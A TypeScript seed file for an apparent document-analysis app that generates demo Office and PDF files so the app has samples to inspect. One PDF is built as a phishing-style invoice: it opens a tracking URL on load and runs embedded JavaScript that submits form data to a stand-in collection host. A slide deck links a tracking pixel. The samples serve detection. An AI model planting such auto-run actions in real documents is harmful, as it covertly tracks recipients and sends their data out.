/**
 * Demo data. Instead of fake JSON, we generate small but real files in the browser and run them
 * through the same analysis pipeline as an upload, so every screen shows genuine results and the
 * delivery flow works on them too.
 */
import JSZip from "jszip";
import { PDFDocument, PDFName, PDFString, StandardFonts, PDFHexString } from "pdf-lib";
import type { IdentityProfile } from "@/types/domain";
import { analyzeBytes } from "@/lib/analysis";
import { xmlEscape } from "@/lib/analysis/common";
import { uid } from "@/lib/format";
import * as store from "./store";

const enc = (s: string) => new TextEncoder().encode(s);

interface DocxSpec {
  core: Record<string, string>;
  app?: Record<string, string>;
  headings: string[];
  paragraphs?: string[];
  externalImage?: string;
  extra?: Record<string, string>;
}

export async function makeOoxml(kind: "docx" | "xlsx" | "pptx", s: DocxSpec): Promise<Uint8Array> {
  const z = new JSZip();
  const main = {
    docx: [
      "word/document.xml",
      "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
    ],
    xlsx: [
      "xl/workbook.xml",
      "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
    ],
    pptx: [
      "ppt/presentation.xml",
      "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml",
    ],
  }[kind] as [string, string];
  z.file(
    "[Content_Types].xml",
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/${main[0]}" ContentType="${main[1]}"/><Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>${s.app ? `<Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>` : ""}</Types>`,
  );
  z.file(
    "_rels/.rels",
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="${main[0]}"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>${s.app ? `<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="docProps/app.xml"/>` : ""}</Relationships>`,
  );
  const core = Object.entries(s.core)
    .map(([k, v]) =>
      k.startsWith("dcterms:")
        ? `<${k} xsi:type="dcterms:W3CDTF">${v}</${k}>`
        : `<${k}>${xmlEscape(v)}</${k}>`,
    )
    .join("");
  z.file(
    "docProps/core.xml",
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">${core}</cp:coreProperties>`,
  );
  if (s.app)
    z.file(
      "docProps/app.xml",
      `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">${Object.entries(
        s.app,
      )
        .map(([k, v]) => `<${k}>${xmlEscape(v)}</${k}>`)
        .join("")}</Properties>`,
    );
  if (kind === "docx") {
    const p = (t: string, style?: string) =>
      `<w:p>${style ? `<w:pPr><w:pStyle w:val="${style}"/></w:pPr>` : ""}<w:r><w:rPr><w:rFonts w:ascii="Calibri"/></w:rPr><w:t xml:space="preserve">${xmlEscape(t)}</w:t></w:r></w:p>`;
    const body = s.headings
      .map(
        (h, i) =>
          p(h, "Heading1") +
          p(s.paragraphs?.[i] ?? "Lorem ipsum dolor sit amet, consectetur adipiscing elit."),
      )
      .join("");
    const img = s.externalImage ? `<w:p><w:r><w:t>logo</w:t></w:r></w:p>` : "";
    z.file(
      "word/document.xml",
      `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${body}${img}</w:body></w:document>`,
    );
    z.file(
      "word/fontTable.xml",
      `<?xml version="1.0" encoding="UTF-8"?><w:fonts xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:font w:name="Calibri"/><w:font w:name="Cambria"/></w:fonts>`,
    );
    z.file(
      "word/_rels/document.xml.rels",
      `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${s.externalImage ? `<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="${xmlEscape(s.externalImage)}" TargetMode="External"/>` : ""}</Relationships>`,
    );
  } else if (kind === "xlsx") {
    z.file(
      "xl/workbook.xml",
      `<?xml version="1.0" encoding="UTF-8"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets>${s.headings.map((h, i) => `<sheet name="${xmlEscape(h)}" sheetId="${i + 1}"/>`).join("")}</sheets></workbook>`,
    );
  } else {
    z.file(
      "ppt/presentation.xml",
      `<?xml version="1.0" encoding="UTF-8"?><p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"/>`,
    );
    s.headings.forEach((h, i) =>
      z.file(
        `ppt/slides/slide${i + 1}.xml`,
        `<?xml version="1.0" encoding="UTF-8"?><p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><p:ph type="title"/><a:t>${xmlEscape(h)}</a:t></p:sld>`,
      ),
    );
    if (s.externalImage)
      z.file(
        "ppt/slides/_rels/slide1.xml.rels",
        `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="${xmlEscape(s.externalImage)}" TargetMode="External"/></Relationships>`,
      );
  }
  for (const [k, v] of Object.entries(s.extra ?? {})) z.file(k, v);
  return z.generateAsync({ type: "uint8array", compression: "DEFLATE" });
}

async function makePdf(o: {
  title: string;
  lines: string[];
  info: Record<string, string>;
  openUri?: string;
  js?: string;
}): Promise<Uint8Array> {
  const doc = await PDFDocument.create({ updateMetadata: false });
  const font = await doc.embedFont(StandardFonts.Helvetica);
  const bold = await doc.embedFont(StandardFonts.HelveticaBold);
  const page = doc.addPage([595, 842]);
  page.drawText(o.title, { x: 56, y: 770, size: 18, font: bold });
  o.lines.forEach((l, i) => page.drawText(l, { x: 56, y: 730 - i * 18, size: 11, font }));
  doc.setTitle(o.title);
  const infoRef = doc.context.trailerInfo.Info;
  const info = infoRef ? doc.context.lookup(infoRef) : undefined;
  if (info && "set" in info) {
    for (const [k, v] of Object.entries(o.info))
      (info as { set: (k: PDFName, v: unknown) => void }).set(
        PDFName.of(k),
        k.endsWith("Date") ? PDFString.of(v) : PDFHexString.fromText(v),
      );
  }
  if (o.openUri)
    doc.catalog.set(
      PDFName.of("OpenAction"),
      doc.context.obj({ S: "URI", URI: PDFString.of(o.openUri) }),
    );
  if (o.js)
    page.node.set(
      PDFName.of("AA"),
      doc.context.obj({ O: { S: "JavaScript", JS: PDFString.of(o.js) } }),
    );
  return doc.save({ useObjectStreams: false });
}

const days = (n: number, h = 10) => {
  const d = new Date();
  d.setDate(d.getDate() - n);
  d.setHours(h, 12, 0, 0);
  return d.toISOString();
};

export const SEED_PROFILE: IdentityProfile = {
  id: "seed-eliude",
  fullName: "Eliúde Francisco",
  role: "Diretor de Operações",
  email: "eliude.francisco@call4all.co.ao",
  computerName: "C4A-LDA-EF01",
  os: "Windows 11 Pro 23H2",
  application: "Microsoft Word 16.0",
  company: "Call4All, Lda.",
  timezone: "Africa/Luanda",
  createdAt: new Date().toISOString(),
};

export async function seedDemo() {
  if (await store.isSeeded()) return;
  await store.markSeeded();
  await store.saveProfile(SEED_PROFILE);
  await store.saveProfile({
    ...SEED_PROFILE,
    id: "seed-ana",
    fullName: "Ana Domingos",
    role: "Gestora Comercial",
    email: "ana.domingos@call4all.co.ao",
    computerName: "C4A-LDA-AD07",
    application: "Microsoft Word 16.0",
  });

  const opts = { maxSizeMb: 50, deepPdf: true, reportLinks: false };
  const files: { name: string; bytes: Uint8Array; at: string; by: string }[] = [];

  files.push({
    name: "Fatura_Pendente_0931.pdf",
    at: days(1, 9),
    by: "Ana Domingos",
    bytes: await makePdf({
      title: "Fatura n.º 0931 — pagamento pendente",
      lines: [
        "Exmo(a). Cliente,",
        "Segue em anexo a fatura referente ao mês corrente.",
        "Valor: 1 248 000,00 Kz",
      ],
      info: {
        Producer: "Skia/PDF m118",
        Creator: "HeadlessChrome",
        Author: "",
        CreationDate: "D:20261108031200Z",
        ModDate: "D:20261108031200Z",
      },
      openUri: "http://px.mail-track.example.net/o.gif?id=7f3a91",
      js: "this.submitForm({cURL:'http://collect.example.net/f', cSubmitAs:'HTML'});",
    }),
  });

  files.push({
    name: "Relatorio_Mensal_Outubro.docx",
    at: days(2, 15),
    by: "Eliúde Francisco",
    bytes: await makeOoxml("docx", {
      core: {
        "dc:title": "Relatório Mensal — Outubro",
        "dc:creator": "python-docx",
        "cp:lastModifiedBy": "python-docx",
        "cp:revision": "1",
        "dcterms:created": "2013-12-23T23:15:00Z",
        "dcterms:modified": "2013-12-23T23:15:00Z",
        "dc:description": "generated by python-docx",
      },
      headings: [
        "Sumário executivo",
        "Indicadores do mês",
        "Riscos identificados",
        "Próximos passos",
      ],
      extra: { "customXml/item1.xml": "<root>/mnt/data/relatorio_outubro.docx</root>" },
    }),
  });

  const contrato = (rev: number, mins: number, mod: string, extra: string[]) =>
    makeOoxml("docx", {
      core: {
        "dc:title": "Contrato de Prestação de Serviços",
        "dc:creator": "Eliúde Francisco",
        "cp:lastModifiedBy": rev > 4 ? "Ana Domingos" : "Eliúde Francisco",
        "cp:revision": String(rev),
        "dcterms:created": "2026-10-14T08:41:00Z",
        "dcterms:modified": mod,
      },
      app: {
        Application: "Microsoft Office Word",
        AppVersion: "16.0000",
        Company: "Call4All, Lda.",
        Template: "Normal.dotm",
        TotalTime: String(mins),
        Pages: "6",
      },
      headings: [
        "Objeto",
        "Obrigações das partes",
        "Preço e condições de pagamento",
        "Confidencialidade",
        ...extra,
      ],
    });
  files.push({
    name: "Contrato_Prestacao_Servicos.docx",
    at: days(12, 11),
    by: "Eliúde Francisco",
    bytes: await contrato(3, 46, "2026-10-14T10:02:00Z", []),
  });
  files.push({
    name: "Contrato_Prestacao_Servicos_v2.docx",
    at: days(8, 16),
    by: "Ana Domingos",
    bytes: await contrato(6, 91, "2026-10-21T15:30:00Z", ["Vigência e rescisão"]),
  });
  files.push({
    name: "Contrato_Prestacao_Servicos_v3.docx",
    at: days(3, 10),
    by: "Eliúde Francisco",
    bytes: await contrato(9, 128, "2026-11-05T09:12:00Z", [
      "Vigência e rescisão",
      "Foro competente",
    ]),
  });

  files.push({
    name: "Orcamento_2027.xlsx",
    at: days(4, 14),
    by: "Ana Domingos",
    bytes: await makeOoxml("xlsx", {
      core: {
        "dc:creator": "openpyxl",
        "dcterms:created": "2026-11-04T13:20:11Z",
        "dcterms:modified": "2026-11-04T13:20:11Z",
      },
      headings: ["Resumo", "Receitas", "Custos fixos", "Investimento"],
    }),
  });

  files.push({
    name: "Apresentacao_Resultados_Q3.pptx",
    at: days(6, 12),
    by: "Eliúde Francisco",
    bytes: await makeOoxml("pptx", {
      core: {
        "dc:title": "Resultados Q3",
        "dc:creator": "Eliúde Francisco",
        "cp:lastModifiedBy": "Eliúde Francisco",
        "cp:revision": "14",
        "dcterms:created": "2026-09-30T07:10:00Z",
        "dcterms:modified": "2026-10-02T17:45:00Z",
      },
      app: {
        Application: "Microsoft Office PowerPoint",
        AppVersion: "16.0000",
        Company: "Call4All, Lda.",
        TotalTime: "212",
        Slides: "4",
      },
      headings: [
        "Resultados do 3.º trimestre",
        "Receita por linha de serviço",
        "Satisfação do cliente",
        "Plano para Q4",
      ],
      externalImage: "https://cdn.partner-assets.example.com/pixel/track.png?u=ef",
    }),
  });

  files.push({
    name: "Proposta_Comercial_Atendimento.pdf",
    at: days(9, 9),
    by: "Eliúde Francisco",
    bytes: await makePdf({
      title: "Proposta Comercial — Serviço de Atendimento",
      lines: [
        "1. Enquadramento",
        "2. Âmbito do serviço",
        "3. Níveis de serviço (SLA)",
        "4. Investimento",
      ],
      info: {
        Author: "Eliúde Francisco",
        Creator: "Microsoft® Word para Microsoft 365",
        Producer: "Microsoft® Word para Microsoft 365",
        CreationDate: "D:20261030091400+01'00'",
        ModDate: "D:20261030112210+01'00'",
      },
    }),
  });

  for (const f of files) {
    const out = await analyzeBytes(f.bytes, f.name, opts);
    const res = await store.ingest({
      fileName: f.name,
      size: f.bytes.length,
      hash: out.hash,
      bytes: f.bytes,
      analysis: out.analysis,
      uploadedBy: f.by,
    });
    // Spread demo activity over the last days.
    res.version.uploadedAt = f.at;
    if (res.doc.versions.length === 1) res.doc.createdAt = f.at;
    res.doc.updatedAt = f.at;
    await store.upsertDocument(res.doc);
  }
  void uid;
}
